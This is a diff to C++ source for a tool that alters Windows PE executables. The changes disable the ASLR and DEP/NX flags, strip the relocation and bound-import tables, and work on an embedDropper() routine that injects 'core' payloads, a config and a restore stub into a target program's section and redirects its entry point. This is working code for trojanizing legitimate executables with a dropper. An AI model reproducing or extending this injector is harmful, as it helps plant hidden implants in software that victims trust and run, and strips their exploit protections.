@@ -133,7 +133,7 @@ bool PEObject::_parseNTHeader()
 		cout << "Executable is not for IA-32 Win32 systems." << endl;
 		return false;
 	}
-
+	
 	// check if ASLR or NXCOMPAT is enabled, in case clear them
 	if ( _ntHeader->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
 		_ntHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
@@ -141,12 +141,20 @@ bool PEObject::_parseNTHeader()
 		_ntHeader->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_NX_COMPAT;
 	
 	// CHECK FOR BOUND IMPORT TABLE, IF PRESENT RESET IT
-	
 	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress)
 	{
 		cout << "Resetting BOUND IMPORT TABLE" << endl;
 		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].VirtualAddress = 0;
 		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT].Size = 0;
+	}
+	
+	// CHECK FOR RELOCATION SECTION, IF PRESENT RESET IT
+	// this works since we reset also the ASLR, thus .reloc is not going to be used by the loader
+	if (_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)
+	{
+		cout << "Resetting RELOCATIONS TABLE" << endl;
+		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress = 0;
+		_ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size = 0;
 	}
 	
 	/*
@@ -183,7 +191,7 @@ bool PEObject::_parseNTHeader()
 			cout << "INVALID PE: raw size of section " << iC << " is greater than file size." << endl;
 			return false;
 		}
-
+		
 		/*
 		cout << "Section " << iC << endl;
 		cout << "\tVirtualAddress  : 0x" << right << std::setw(8) << std::setfill('0') << hex << section->VirtualAddress() + this->_ntHeader->OptionalHeader.ImageBase << endl;
@@ -235,10 +243,6 @@ bool PEObject::saveToFile(std::string filename)
 		
 		_ntHeader->FileHeader.NumberOfSections = _sections.size();
 		
-		/*** fix SizeOfImage ***/
-		_ntHeader->OptionalHeader.SizeOfImage = 
-			_sections[_sections.size() - 1]->VirtualAddress() + _sections[_sections.size() - 1]->VirtualSize();
-		
 		/*** write DOS header ***/
 		cout << "Writing DOS Header @ 0x" << right << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
 		outfile.write( reinterpret_cast<char*>(_dosHeader.header) , sizeof(IMAGE_DOS_HEADER) );
@@ -246,10 +250,21 @@ bool PEObject::saveToFile(std::string filename)
 		/*** write DOS stub ***/
 		cout << "Writing DOS Stub @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
 		outfile.write( _dosHeader.stub , _dosHeader.stub_size );
+
+		/*** fix section headers ***/
+		for (std::size_t i = 1; i <_sections.size(); i++) {
+			GenericSection* prevSection = _sections[i-1];
+			_sections[i]->Header()->PointerToRawData = prevSection->PointerToRawData() + alignTo(prevSection->SizeOfRawData(), fileAlignment());
+			_sections[i]->Header()->VirtualAddress = prevSection->VirtualAddress() + alignTo(prevSection->VirtualSize(), sectionAlignment());
+		}
+
+		/*** fix SizeOfImage ***/
+		_ntHeader->OptionalHeader.SizeOfImage = 
+			_sections.back()->VirtualAddress() + _sections.back()->VirtualSize();
 		
 		/*** write NT headers ***/
 		cout << "Writing NT Header @ 0x" << setfill('0') << setw(8) << hex << outfile.tellp() << endl;
-		outfile.write(reinterpret_cast<char*>(_ntHeader), sizeof(IMAGE_NT_HEADERS32) );
+		outfile.write(reinterpret_cast<char*>(_ntHeader), sizeof(IMAGE_NT_HEADERS32)); 
 		
 		/*** copy section headers ***/
 		for (std::size_t i = 0; i < _sections.size(); i++) {
@@ -410,8 +425,8 @@ bool PEObject::_parseResources()
 	//
 	// check if resource section is last one
 	//
-	if (resSection != _sections.back())
-		throw parsing_error("Resource section is not the last section in file.");
+	// if (resSection != _sections.back())
+	//	throw parsing_error("Resource section is not the last section in file.");
 	
 	try {
 		_resources.dir = _scanResources(resSection->data());
@@ -517,6 +532,8 @@ ResourceDirectory* PEObject::_scanResources( PRESOURCE_DIRECTORY rdRoot, PRESOUR
 					rde->Size,
 					rde->CodePage);
 				
+				newRde->SetData(data, rde->Size);
+#if 0
 				if ( section == getSection(IMAGE_DIRECTORY_ENTRY_RESOURCE) ) {
 					newRde->SetAdded(true);
 					newRde->SetData(data, rde->Size);
@@ -524,7 +541,7 @@ ResourceDirectory* PEObject::_scanResources( PRESOURCE_DIRECTORY rdRoot, PRESOUR
 				} else {
 					// cout << "Resource data is outside RESOURCE section." << endl;
 				}
-			
+#endif			
 			} else {
 				cout << "NO SECTION FOUND FOR RESOURCE" << endl;
 				newRde = new ResourceDataEntry(
@@ -1106,12 +1123,15 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	}
 	
 	char* ptr = sectionData;
+	cout << "ptr skew " << (ptr - sectionData) << " [size " << 0 << "]" << endl;
+	
 	memcpy(ptr, targetSection->data(), targetSection->SizeOfRawData());
 	ptr += alignToDWORD(targetSection->SizeOfRawData());
+	cout << "ptr skew " << (ptr - sectionData) << " [size " << targetSection->SizeOfRawData() << "]" << endl; 
 	
 	// calculate dropper offset in section
 	DWORD dropperSkew = ptr - sectionData;
-
+	
 	DWORD epVA = 
 		ntHeaders()->OptionalHeader.ImageBase 
 		+ targetSection->VirtualAddress() 
@@ -1142,6 +1162,7 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 	restoreStub.relocCode( ptr + dropper.restoreStubOffset() );
 	
 	ptr += alignToDWORD(dropper.size());
+	cout << "ptr skew " << (ptr - sectionData) << " [size " << dropper.size() << "]" << endl; 
 	
 	// write resources
 	if (fixManifest) {
@@ -1150,11 +1171,16 @@ bool PEObject::embedDropper( bf::path core, bf::path core64, bf::path config, bf
 		} catch (...) {
 			throw std::exception("Cannot fix manifest");
 		}
+		DWORD skew = (DWORD)(ptr - sectionData);
 		DWORD VA = targetSection->VirtualAddress() + ( (DWORD)ptr - (DWORD)sectionData );
+		cout << "*** RESOURCE SECTION RVA " << hex << targetSection->VirtualAddress() << endl;
+		cout << "*** RESOURCE SECTION SKEW " << hex << skew << endl;
+		cout << "*** RESOURCE SECTION REWRITTEN @ " << hex << VA << endl;
 		std::size_t size = _writeResources( ptr, VA );
 		dataDirectory(IMAGE_DIRECTORY_ENTRY_RESOURCE)->VirtualAddress = VA;
 		dataDirectory(IMAGE_DIRECTORY_ENTRY_RESOURCE)->Size = size;
 		ptr += size;
+		cout << "ptr skew " << (ptr - sectionData) << " [size " << size << "]" << endl;
 	}
 	
 	// calculate total section size
